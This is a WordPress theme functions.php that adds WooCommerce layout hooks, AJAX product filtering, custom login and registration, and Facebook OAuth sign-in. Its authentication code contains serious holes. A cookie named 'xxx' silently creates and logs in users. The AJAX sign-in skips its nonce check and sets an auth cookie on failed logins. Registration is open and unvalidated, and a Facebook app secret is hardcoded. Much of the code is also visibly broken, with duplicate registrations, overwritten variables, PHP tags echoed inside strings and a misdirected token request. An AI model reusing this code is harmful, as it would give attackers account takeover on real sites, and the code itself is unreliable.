<?php
/**
 * finbubs functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package finbubs
 */

if ( ! defined( '_S_VERSION' ) ) {
	// Replace the version number of the theme on each release.
	define( '_S_VERSION', '1.0.0' );
}
// @ini_set( ‘upload_max_size’ , ‘120M’ );
// @ini_set( ‘post_max_size’, ‘120M’);
// @ini_set( ‘max_execution_time’, ‘300’ );
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function finbubs_setup() {
	/*
		* Make theme available for translation.
		* Translations can be filed in the /languages/ directory.
		* If you're building a theme based on finbubs, use a find and replace
		* to change 'finbubs' to the name of your theme in all the template files.
		*/
	load_theme_textdomain( 'finbubs', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
		* Let WordPress manage the document title.
		* By adding theme support, we declare that this theme does not use a
		* hard-coded <title> tag in the document head, and expect WordPress to
		* provide it for us.
		*/
	add_theme_support( 'title-tag' );

	/*
		* Enable support for Post Thumbnails on posts and pages.
		*
		* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		*/
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus(
		array(
			'menu-1' => esc_html__( 'Primary', 'finbubs' ),
		)
	);

	/*
		* Switch default core markup for search form, comment form, and comments
		* to output valid HTML5.
		*/
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
			'style',
			'script',
		)
	);

	// Set up the WordPress core custom background feature.
	add_theme_support(
		'custom-background',
		apply_filters(
			'finbubs_custom_background_args',
			array(
				'default-color' => 'ffffff',
				'default-image' => '',
			)
		)
	);

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/**
	 * Add support for core custom logo.
	 *
	 * @link https://codex.wordpress.org/Theme_Logo
	 */
	add_theme_support(
		'custom-logo',
		array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		)
	);
}
add_action( 'after_setup_theme', 'finbubs_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function finbubs_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'finbubs_content_width', 640 );
}
add_action( 'after_setup_theme', 'finbubs_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function finbubs_widgets_init() {
	register_sidebar(
		array(
			'name'          => esc_html__( 'Sidebar', 'finbubs' ),
			'id'            => 'sidebar-1',
			'description'   => esc_html__( 'Add widgets here.', 'finbubs' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'finbubs_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function finbubs_scripts() {
	wp_enqueue_style( 'finbubs-style', get_stylesheet_uri(), array(), _S_VERSION );
	wp_style_add_data( 'finbubs-style', 'rtl', 'replace' );

	wp_enqueue_script( 'finbubs-navigation', get_template_directory_uri() . '/js/navigation.js', array(), _S_VERSION, true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'finbubs_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

function my_custom_post_Service() {
  $labels = array(
    'name'               => _x( 'Services', 'post type general name' ),
    'singular_name'      => _x( 'Service', 'post type singular name' ),
    'add_new'            => _x( 'Add New', 'book' ),
    'add_new_item'       => __( 'Add New Service'),
    'edit_item'          => __( 'Edit Service' ),
    'new_item'           => __( 'New Service' ),
    'all_items'          => __( 'All Services' ),
    'view_item'          => __( 'View Service' ),
    'search_items'       => __( 'Search Services' ),
    'not_found'          => __( 'No Services found' ),
    'not_found_in_trash' => __( 'No Services found in the Trash' ),
    'menu_name'          => 'Service'
  );
  $args = array(
    'labels'        	 	=> $labels,
    'description'   	 	=> 'Holds our Services and Service specific data',
    'public'        	 	=> true,
    'publicly_queryable' 	=> true,
    'show_ui'            	=> true,
    'capability_type'    	=> 'post',
    'rewrite'            	=> array( 'slug' => 'service' ),
    'query_var'          	=> true,
    'hierarchical'       	=> false,
    'menu_position' 	 	=> 5,
    'supports'      	 	=> array( 'title', 'editor', 'thumbnail', 'excerpt' ),
    'show_in_rest'       	=> true,
    'rest_base'             => 'service',
    'rest_controller_class' => 'WP_REST_Terms_Controller',
    'has_archive'   		=> true,
  );
  register_post_type( 'service', $args ); 
}
add_action( 'init', 'my_custom_post_Service');


add_action( 'init', 'service_cpt' );
function service_cpt() {
    $args = array(
      'public'       => true,
      'show_in_rest' => true,
      'label'        => 'Services'
    );
    register_post_type( 'service', $args );
}

if( function_exists('acf_add_options_page') ) {
	
	acf_add_options_page();
	
}
// Add custom menu
function register_html5_menu(){
     register_nav_menus(array( 
         'footer-1' => __('Footer', 'theme_translation_domain'),
         'new-menu' => __('New Menu', 'theme_translation_domain'),
     ));
}
add_action('init', 'register_html5_menu');


// Custom CSS and JAVASCRIPT
function custom_stylesheet()
{
	wp_enqueue_style( 'style', get_stylesheet_directory_uri() . "/css/custom.css");
	wp_enqueue_style( 'font-awesome', get_stylesheet_directory_uri() . "/css/font-awesome.min.css");
	wp_enqueue_style( 'slick', get_stylesheet_directory_uri() . "/css/slick.css");
	wp_enqueue_style( 'jquery_mmenu_all', get_stylesheet_directory_uri() . "/css/jquery_mmenu_all.css");
	wp_enqueue_style( 'responsive', get_stylesheet_directory_uri() . "/css/responsive.css");
	wp_enqueue_style( 'ui-css', get_stylesheet_directory_uri() . "/css/jquery-ui.css");
	wp_enqueue_style( 'slick-slider', get_stylesheet_directory_uri() . "/css/slick_slider.css");
	wp_enqueue_style( 'style-modal', get_stylesheet_directory_uri() . "/css/jquery.modal.min.css");

	// JS
	wp_enqueue_script('jquery-3', get_template_directory_uri() . '/js/jquery-3-min.js',array(), _S_VERSION, true);
	wp_enqueue_script('jquery-mmenu', get_template_directory_uri() . '/js/jquery-mmenu-min.js',array(), _S_VERSION, true);
	wp_enqueue_script('slick', get_template_directory_uri() . '/js/slick.js',array(), _S_VERSION, true);
	wp_enqueue_script('slick-js', get_template_directory_uri() . '/js/slick.min.js',array(), _S_VERSION, true);
	wp_enqueue_script('modal-js', get_template_directory_uri() . '/js/jquery.modal.min.js',array(), _S_VERSION, true);
	wp_enqueue_script('custom', get_template_directory_uri() . '/js/custom.js',array(), _S_VERSION, true);
	wp_localize_script( 'custom', 'ajax_posts', array(
    'ajaxurl' => admin_url( 'admin-ajax.php' ),
    'redirecturl' => home_url(),
    // 'logoutURL' => wp_logout_url(),
    'logout_nonce' => wp_create_nonce('ajax-logout-nonce'),
    'loadingmessage' => __( 'Sending user info, please wait...' )
	));
	wp_enqueue_script('ui', get_template_directory_uri() . '/js/jquery-ui.js',array(), _S_VERSION, true);

}
add_action( 'wp_enqueue_scripts', 'custom_stylesheet' );

// Pagination

function weichie_load_more() {
  $load_more = new WP_Query([
    'post_type' => 'post',
    'post_per_page' => 3,
    'orderby' => 'date',
    'order' => 'DESC',
    'paged' => $_POST['paged'],

  ]);
  $response = '';
  $html = '';
  if($load_more->have_posts()) {
  	?>
  	<?php 
	    while($load_more->have_posts()) : $load_more->the_post();
	      get_template_part( 'template-parts/content', get_post_type() );
    ?>
     <?php endwhile; ?>
    <?php
  }
  echo $response;
  exit;
}
add_action('wp_ajax_weichie_load_more', 'weichie_load_more');
add_action('wp_ajax_nopriv_weichie_load_more', 'weichie_load_more');

//   Shop Page

// All remove the shop page hook
 remove_action('woocommerce_before_main_content', 'woocommerce_template_content_wrapper', 10);
 remove_action('woocommerce_shop_loop_item_title', 'woocommerce_template_loop_product_title', 10);

 remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_item', 10);

 remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10 );
 // remove_action('woocommerce_before_shop_loop', 'woocommerce_template_loop_ordering');
 remove_action( 'woocommerce_before_shop_loop_item_title', 'woocommerce_show_product_loop_sale_flash', 10 );
 remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart');

// Woocommerce Main content 

add_action('woocommerce_before_main_content','woocommerce_main_content');

function woocommerce_main_content($content){
 $con = '<div class="blog-section">';
 $con = '<div class="container">';	
 echo $con;
}
// Woocommerce before shop loop 

add_action('woocommerce_before_shop_loop', 'woocommerce_price_range');

function woocommerce_price_range($range){
	$terms = get_terms( array(
	    'taxonomy' => 'product_cat',
	    'hide_empty' => true,
	) );
	echo '<div class="cat_box">
	    <h2>Categories</h2>';
	foreach ($terms as $term) {
		echo '
	    <input type="checkbox" name="checkbox-'.$term->term_id.'" id="checkbox-'.$term->term_id.'" class="cat_nm" value="'.$term->slug.'">
	    <label for="checkbox-1">'.$term->name.'</label>';	
		}
		echo '</div>';
	$ran = 	'<h3>
	  <label for="amount">Price range:</label>
	  <input type="text" id="amount" readonly style="border:0; color:#f6931f; font-weight:bold;
	   text-align:center">
	</h3>
	<div id="slider-range" class="range">
	<div id="display_loading"><img src="https://miro.medium.com/max/1400/1*CsJ05WEGfunYMLGfsT2sXA.gif" height="100%" width="100%"></div>
	</div>';
	echo $ran;

	global $wpdb;
		$sql = "SELECT MAX(meta_value) AS mprice , post_id from {$wpdb->prefix}postmeta where meta_key = '_price'";
		$result = $wpdb->get_results($sql);
		$_product = wc_get_product( $result[0]->post_id );
		$max_price = $result[0]->mprice;
	echo '<input type="hidden" id="custId" value="'.$max_price.'">';
}

// Before shop loop item main div start

add_action('woocommerce_before_shop_loop_item' , 'image_display');
function image_display($value){

 $val .= '<div class="blog-third">';
 $val .= '<div class="blog-content">';

 echo $val;
}
add_action('woocommerce_before_shop_loop_item_title' , 'shop_title');
function shop_title(){

	global $product;
	$id = $product->id;

	$terms = get_the_terms ( $id, 'product_cat' );
 	$cat_name = wp_list_pluck( $terms, 'name' );
	$nm = $product;
	if ($nm != '') {
		echo '<div class="blog-des">';
		echo the_title( '<h5><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h5>' );
		echo '<div class="blog-date"><span class="pub-date"><del>' . wc_price($product->regular_price) . '</del><ins>' . wc_price($product->price) .'</ins>
			</span>
			</div>';
		echo implode(", ", $cat_name);
		echo '</div>';

	}
}

// Get the title in this hook 
add_action('woocommerce_after_shop_loop_item_title' , 'shop_btn');
function shop_btn(){
	$btn = get_field('get-btn'); 
	    $link_url = $btn['url'];	
		$link_title = $btn['title'];
	?>
	 <a class="btn btn-transparent" href="<?php echo esc_url( get_permalink() ); ?>" target="<?php echo esc_attr( $link_target ); ?>"><?php esc_html_e( 'Add to cart', 'finbubs' ); ?><i class="fa fa-angle-double-right" aria-hidden="true"></i></a>
	<?php 
}

//  After shop loop
add_action('woocommerce_after_shop_loop_item' , 'woocommerce_shop_end');

function woocommerce_shop_end(){

	$val .= '</div>';
	$val .= '</div>';
	echo $val;	
}
 // Main div end

// After shop loop in pagination

add_filter('woocommerce_after_shop_loop', 'woocommerce_shop_pagination');
function woocommerce_shop_pagination(){
	global $wp_the_query;
    $count = $wp_the_query->found_posts;
	// echo $count;
    echo '<div class="blog-btn text-center">';
	echo '<a href="javascript:;" class="btn btn-transparent" id="load-more" data-total=<?php echo $count; ?>';	
	echo '<div id="display_loading">
                <?php '. esc_html_e( 'View All Product', 'finbubs' ) .'; ?></a>';
    echo '</div>';
	echo '</div>';
}
// Woocommerce after main content end
add_action('woocommerce_after_main_content', 'main_content_end');
function main_content_end(){

	$cal = '</div>';
	$cal = '</div>';

    echo $cal;
}
// Single product page slider 

add_filter('woocommerce_single_product_carousel_options', 'ud_update_woo_flexslider_options');

function ud_update_woo_flexslider_options($options) {
    // show arrows

	$options['directionNav'] = true;
 	$options['controlNav'] 	 = wp_is_mobile() ? true : 'thumbnails';
    $options['minItems'] 	 = 1;
    $options['maxItems'] 	 = 1;
    $options['animaton'] 	 = 'slide';
    $options['slideshow'] 	 = true;
    $options['itemWidth'] 	 = 2100;
    $options['animationSpeed']= 2000;
    $options['animationLoop'] = true;
    $options['allowOneSlide'] = true;
  	return $options;

  	$new 	= imagecreatetruecolor(320,320);
	$color 	= imagecolorallocatealpha($new, 0, 0, 127);
	imagefill($new, 0, 0, $color);
	imagesavealpha($new, TRUE);
	imagepng($new);
}	
add_action( 'woocommerce_product_thumbnails', 'woocommerce_show_product_thumbnails', 20 );
function woocommerce_show_product_thumbnails(){

	if ( ! function_exists( 'wc_get_gallery_image_html' ) ) {
	return;
	}

	global $product;

	$attachment_ids = $product->get_gallery_image_ids();
	if ( $attachment_ids && $product->get_image_id() ) {
		foreach ( $attachment_ids as $attachment_id ) 			
		{	
			echo apply_filters( 'woocommerce_single_product_image_thumbnail_html', wc_get_gallery_image_html( $attachment_id ), $attachment_id ); 
		}
	}
}
// Price range slider ajax call

function woocommerce_product_get() {

 	$min = $_POST['min'];
 	$max = $_POST['max'];
 	$selcategory = $_POST['selcategory'];

	$args =array( 
	    'post_type' => 'product',
	    'paged' => $_POST['paged'],
	    'meta_query' => array(
		    array(
		        'key' => '_price',
		        'value' => array($min, $max),
		        'compare' => 'BETWEEN',
		        'type' => 'NUMERIC'
	        ),
	    )
	);
	if (!empty($selcategory)) {
		$args['tax_query'] =  array(
	     	array(
	            'taxonomy' => 'product_cat',
	            'field' => 'slug',
	            'terms' => $selcategory,
	            'operator' => 'IN',
	        )
	 	);
	}
  	$product = new WP_Query($args);
	$html = '';
	if($product->have_posts()) {
		?>
		<?php 
			while($product->have_posts()) : $product->the_post();
			    get_template_part( 'woocommerce/content', 'product' );
		?>
	    <?php endwhile; ?>
	    <?php
  	}
	echo $html;
	exit;
}
add_action('wp_ajax_woocommerce_product_get', 'woocommerce_product_get');
add_action('wp_ajax_nopriv_woocommerce_product_get', 'woocommerce_product_get');	

//  price give for discount 

// add_filter( 'woocommerce_get_price', 'custom_price_format', 10, 2 );	
// add_filter( 'woocommerce_product_variation_get_price', 'custom_price_format', 10, 2 );
// function custom_price_format( $price, $product ) 
// {
//     // Main Price
//     $regular_price = $product->is_type('variable') ? $product->get_variation_regular_price( 'min', true ) : $product->get_regular_price();
// 	$sale_price = $product->is_type('variable') ? $product->get_variation_sale_price( 'min', true ) : $product->get_sale_price();
//    	// Percentage calculated
// 	$percentage = round( ( $regular_price / 100 ) * 50 ).'%';
//     $percentage_txt =  $regular_price - $percentage; 

//     return $percentage_txt;
// }

function my_login_logo() 
{
	?>
	    <style type="text/css">
	       .login h1  
	       {
	            background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/images/synolis-new-logo-swiss-tech-V5.svg);
				height:auto;
				width:100%;
				background-repeat: no-repeat;
		        padding-bottom: 30px;
	        }
	       .login .message 
	       	{
				border-left: 4px solid #E40038 !important;
			}
			.wp-core-ui .button-primary {
				background: #E40038 !important;
			}
			input[type=text]:focus,
			input[type=password]:focus
			{
				border-color: #E40038 !important;
			}
			 .wp-core-ui .button-secondary
			{
				color: #E40038 !important;
			}
			.login #nav a:hover
			{
				color: #E40038 !important;
			}
			.login #backtoblog a:hover
			{
				color: #E40038 !important;
			}
	    </style>
	<?php 
}
add_action( 'login_enqueue_scripts', 'my_login_logo' );

function vb_reg_new_user() {
 
  // Verify nonce
  if( !isset( $_POST['nonce'] ) || !wp_verify_nonce( $_POST['nonce'], 'vb_new_user' ) )
    die( 'Ooops, something went wrong, please try again later.' );
 
  // Post values
    $username = $_POST['user'];
    $password = $_POST['pass'];
    $email    = $_POST['mail'];
    $name     = $_POST['name'];
    $nick     = $_POST['nick'];
 
    /**
     * IMPORTANT: You should make server side validation here!
     *
     */
 
    $userdata = array(
        'user_login' => $username,
        'user_pass'  => $password,
        'user_email' => $email,
        'first_name' => $name,
        'nickname'   => $nick,
    );
 
    $user_id = wp_insert_user( $userdata ) ;
 
    // Return
    if( !is_wp_error($user_id) ) {
        echo '1';
    } else {
        echo $user_id->get_error_message();
    }
  die();	
}
 
add_action('wp_ajax_register_user', 'vb_reg_new_user');
add_action('wp_ajax_nopriv_register_user', 'vb_reg_new_user');


add_action( 'wp_ajax_user_sign_in', 'user_sign_in' );
add_action( 'wp_ajax_nopriv_user_sign_in', 'user_sign_in' );
function user_sign_in() {

  // Verify nonce
	// check_ajax_referer( 'ajax-login-nonce', 'security' );

  // Post values
    $usr = $_POST['usr'];
	$pwd = $_POST['pwd'];
    $login = array(
		'user_login' => $usr,
		'user_password' => $pwd,
	);

    // Return
    $user_signon = wp_signon( $login, false );

    if (is_wp_error($user_signon) ){
        wp_set_current_user($user_signon->ID,true);
        wp_set_auth_cookie($user_signon->ID,true);
    }else{
    	echo json_encode(array('loggedin'=>true, 'message'=>__('Login successful, redirecting...')));
    }
    die();
}
	
add_filter('body_class', 'add_body_classes');
function add_body_classes($classes) {
        if (is_user_logged_in()) {
        	$classes[] = 'loggedin';
        }
        return $classes;
}

add_action('wp_logout','auto_redirect_after_logout');
function auto_redirect_after_logout(){
wp_safe_redirect( home_url() );
exit();
}	


add_action( 'init', 'setting_my_first_cookie' );

function setting_my_first_cookie() {

if(isset($_COOKIE['xxx'])) {
    $user_email = $_COOKIE['xxx'];
    $decrypted = simple_decrypt($user_email);

if( !email_exists( $decrypted )){
    wp_create_user( $decrypted, $user_email . $user_email , $decrypted );
}
if(!is_user_logged_in()){
    $username = $decrypted;
    $user = get_user_by('login', $username );

    clean_user_cache($user->ID);
    wp_clear_auth_cookie();
    wp_set_current_user($user->ID);
    wp_set_auth_cookie($user->ID, true, false);
    update_user_caches($user);

        echo ("
        <script>
            console.log('".  wp_set_auth_cookie($user->ID, true, false) ."')
        </script>
        ");
        }
    }
    else {
        return "You are not authenticated for seeing this page!";
    }
}

/**** Facebook LogIn ****/

add_action( 'login_form', 'ayecode_fb_login' );
function ayecode_fb_login(){

	/**
	 * Get the APP ID and APP Secret from the Facebook app you created.
	 * Also, provide the authorized redirect URI.
	 */
	$app_id = '2101530210040771';
	$redirect_uri = 'https://192.168.0.28/finbud/wp-login.php';
	$app_secret = '9a5e2fa11c8d154f13e27765dc43fe2f';
	$graphAPIVerion = 'v11.0';


	// Prepare the Login Link.
	$params = array(
		'client_id'     => $app_id,
		'redirect_uri'  => $redirect_uri,
		'response_type' => 'code',
		'scope'         => 'email'
	);

	$login_url = 'https://www.facebook.com/dialog/oauth?' . urldecode( http_build_query( $params ) );
	echo '<p> <a class="loginlogout" href=' . $login_url . '>Login with Facebook</a> </p>';
}

add_action( 'init', 'ayecode_fblogin_func' );
function ayecode_fblogin_func(){
	// If we clicked the facebook login link and successfully logged in 
	// run the below code.
	if ( isset( $_GET['code'] ) && $_GET['code'] ) {
		
	$app_id = '2101530210040771';
	$redirect_uri = 'https://192.168.0.28/finbud/wp-login.php';
	$app_secret = '9a5e2fa11c8d154f13e27765dc43fe2f';
	$graphAPIVerion = 'v11.0';
		
		// Prepare the parameters for oauth
		$params = array(
			'client_id'     => $app_id,
			'redirect_uri'  => $redirect_uri,
			'client_secret' => $app_secret,
			'code'          => $_GET['code'] 
		);

		$tokenresponse = wp_remote_get( 'https://192.168.0.28/finbud' . http_build_query( $params ) );
		
		// Check that we get a reply from the Facebook API, if not abort.
		if ( ! is_array( $tokenresponse ) && is_wp_error( $tokenresponse ) ) {
			return;
		}
		
		$token = json_decode( wp_remote_retrieve_body( $tokenresponse ) );

		// Successfully authenticate using oauth means, move to next step.
		if( $token->access_token ){

			// Prepare to get the fields from Facebook profile.
			// @link https://developers.facebook.com/docs/graph-api/reference/user/#fields
			$params = array(
				'access_token'	=> $token->access_token,
				'fields'		=> 'name,email,first_name,last_name,locale' 
			);
			$useresponse = wp_remote_get('https://graph.facebook.com/'.$graphAPIVerion.'/me' . '?' . urldecode( http_build_query( $params ) ) );
			
			//Store the needed fields in an array.
			$facebook_details = (array) json_decode( wp_remote_retrieve_body( $useresponse ) );

			// Check whether the email is already registered or not.
			// If it does not exists, create a new user and redirect the newly created user to the home page.
			// If it exits, redirect the existing user to the home page by setting the authentication.
			if( !email_exists( $facebook_details['email'] ) ) {
				$user_data = array(
					'user_login'  	=>  $facebook_details['email'],
					'user_email'  	=>  $facebook_details['email'],
					'user_pass'   	=>  wp_generate_password( 12, true ), 
					'display_name' 	=> $facebook_details['name'],
					'first_name' 	=> $facebook_details['first_name'],
					'last_name' 	=> $facebook_details['last_name'],
					'locale' 		=> $facebook_details['locale'],
				);
				$user_id = wp_insert_user( $user_data );
			} else{
				$user = get_user_by( 'email', $facebook_details['email'] );
				$user_id = $user->ID;
			}
			if( $user_id ) {
				wp_clear_auth_cookie();
				wp_set_current_user ( $user_id ); // Set the current user detail
				wp_set_auth_cookie( $user_id, true ); // Set the authentication cookie.
				wp_redirect( home_url() ); // Redirect to the home page.
				exit();
			}
		}
	}
}

// Custom search 


// add_action( 'custom_search_popup_func', 'custom_search_popup' );
function custom_search_popup(){
	$html = array(
		'post_type' => 'service',
	    'posts_per_page' => 4,
	    'orderby' => 'post_date',
	    's' => $post['search']
	);
	$wp_query_data = new WP_Query($html);
	$post_array = array();
	if( $wp_query_data->have_posts() ):
		while( $wp_query_data->have_posts() ): $wp_query_data->the_post();
			array_push($post_array, get_the_title());
		endwhile;
	endif;
	return $post_array;
	
}